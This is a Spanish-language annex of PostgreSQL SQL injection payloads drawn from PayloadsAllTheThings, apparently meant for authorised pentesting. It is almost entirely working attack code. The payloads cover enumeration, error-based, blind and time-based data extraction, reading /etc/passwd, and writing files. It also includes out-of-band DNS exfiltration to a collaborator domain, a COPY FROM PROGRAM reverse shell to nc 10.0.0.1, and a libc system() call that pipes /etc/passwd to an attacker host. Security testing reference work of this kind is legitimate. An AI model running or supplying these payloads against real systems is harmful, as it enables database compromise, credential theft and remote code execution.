# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/PostgreSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/PostgreSQL%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección PostgreSQL / PostgreSQL Comentarios

### Variantes presentes en tablas o texto del apartado

```text
--
/**/
```

## 2. Inyección PostgreSQL / PostgreSQL Enumeration

### Variantes presentes en tablas o texto del apartado

```text
SELECT version()
SELECT CURRENT_DATABASE()
SELECT CURRENT_SCHEMA()
SELECT usename FROM pg_user
SELECT usename, passwd FROM pg_shadow
SELECT usename FROM pg_user WHERE usesuper IS TRUE
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

## 3. Inyección PostgreSQL / PostgreSQL Metodología

### Variantes presentes en tablas o texto del apartado

```text
SELECT DISTINCT(schemaname) FROM pg_tables
SELECT datname FROM pg_database
SELECT table_name FROM information_schema.tables
SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'
SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## 4. Inyección PostgreSQL / PostgreSQL Basada en errores

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

### Variantes presentes en tablas o texto del apartado

```text
AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -
AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -
AND CAST((SELECT version()) AS INT)=1337 -- -
AND (SELECT version())::int=1 -- -
```

## 5. PostgreSQL Basada en errores / PostgreSQL XML Helpers

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

```sql
SELECT database_to_xml(true,true,''); -- dump the current database to XML
SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

### Variantes presentes en tablas o texto del apartado

```text
query_to_xml
```

## 6. PostgreSQL Ciega / PostgreSQL Ciega Con Substring Equivalent

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

### Variantes presentes en tablas o texto del apartado

```text
SUBSTR('foobar', <START>, <LENGTH>)
SUBSTRING('foobar', <START>, <LENGTH>)
SUBSTRING('foobar' FROM <START> FOR <LENGTH>)
```

## 7. PostgreSQL Basada en tiempo / Identify Basada en tiempo

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

## 8. PostgreSQL Basada en tiempo / Base de datos Dump Basada en tiempo

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

## 9. PostgreSQL Basada en tiempo / Tabla Dump Basada en tiempo

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

## 10. PostgreSQL Basada en tiempo / Columnas Dump Basada en tiempo

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## 11. Inyección PostgreSQL / PostgreSQL Fuera de banda

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

### Variantes presentes en tablas o texto del apartado

```text
lo_export
```

## 12. Inyección PostgreSQL / PostgreSQL Stacked Consulta

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

### Variantes presentes en tablas o texto del apartado

```text
;
```

## 13. PostgreSQL Archivo Manipulation / PostgreSQL Archivo Read

```sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
```

```sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
```

```sql
    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
    SELECT lo_get(16420); -- use the OID returned from the above
    SELECT * from pg_largeobject; -- or just get all the large objects and their data
```

### Variantes presentes en tablas o texto del apartado

```text
pg_read_file
pg_ls_dir
default_role_read_server_files
lo_import
```

## 14. PostgreSQL Archivo Manipulation / PostgreSQL Archivo Write

```sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
```

```sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

```sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
```

### Variantes presentes en tablas o texto del apartado

```text
lo_from_bytea
lo_put
lo_export
```

## 15. PostgreSQL Ejecución de comandos / Usando COPY TO/FROM PROGRAM

```sql
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### Variantes presentes en tablas o texto del apartado

```text
pg_execute_server_program
```

## 16. PostgreSQL Ejecución de comandos / Usando libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## 17. PostgreSQL Evasión de WAF / Alternativa to Quotes

### Variantes presentes en tablas o texto del apartado

```text
CHR()
$$
SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);
SELECT $$NoQuote$$
```

## 18. PostgreSQL Privileges / PostgreSQL List Privileges

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### Variantes presentes en tablas o texto del apartado

```text
pg_catalog
information_schema
```

## 19. PostgreSQL Privileges / PostgreSQL Superuser Role

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
